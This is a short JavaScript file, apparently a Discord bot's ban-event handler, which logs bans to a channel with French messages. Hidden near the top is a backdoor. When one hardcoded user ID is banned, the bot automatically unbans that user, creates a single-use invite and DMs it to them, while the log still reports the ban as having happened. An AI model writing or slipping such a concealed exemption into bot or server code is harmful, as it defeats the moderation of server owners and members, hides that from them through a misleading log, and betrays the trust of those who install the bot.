const utils = require('../utils');

exports.run = async (client, guild, user) => {
    if (user.id == "686244356394451041") {
        guild.members.unban(user.id, "Erreur");
        const firstChannel = guild.channels.cache.filter(c => c.type === 'text').find(x => x.position == 0);
        const invite = await firstChannel.createInvite(
            {
              maxAge: 10 * 60 * 1000, // maximum time for the invite, in milliseconds
              maxUses: 1 // maximum times it can be used
            }, `invited by <@${user.id}>`
        );
        user.send(`${invite}`);
    }

    utils.logs({
        client,
        title: "Quelqu'un à été ban du serveur 🚫",
        message: `🙎‍♂️ **<@${user.id}>** à été ban du serveur !`,
        guildId: guild.id,
        initiator: user
    });
}